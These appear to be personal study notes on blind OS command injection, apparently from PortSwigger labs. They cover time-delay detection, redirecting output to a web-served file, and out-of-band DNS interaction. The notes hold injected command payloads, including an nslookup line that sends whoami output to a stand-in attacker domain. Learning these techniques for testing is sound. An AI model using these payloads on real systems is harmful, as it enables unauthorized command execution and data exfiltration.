## Blind Command Injection
### Time Delay
Time delay is useful to detect whether or not the application is vulnerable towards CI

This can be accomplished with

```
& ping -c 10 127.0.0.1 &
```

![[Pasted image 20250307161734.png]]

However, time-delay is very specific on which parameter would work

### Input redirection
For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:

`& whoami > /var/www/static/whoami.txt &`

The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.

the most annoything about Portswigger is that obfuscation fails??? Like wtf???
![[Pasted image 20250307163241.png]]

### Out-of-band
#### Interaction
Same purpose with time delay, to see if the system is vulnerable
```
& nslookup kgji2ohoyw.web-attacker.com &
```
#### Data exfiltration
To retrieve data alongside the dns

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```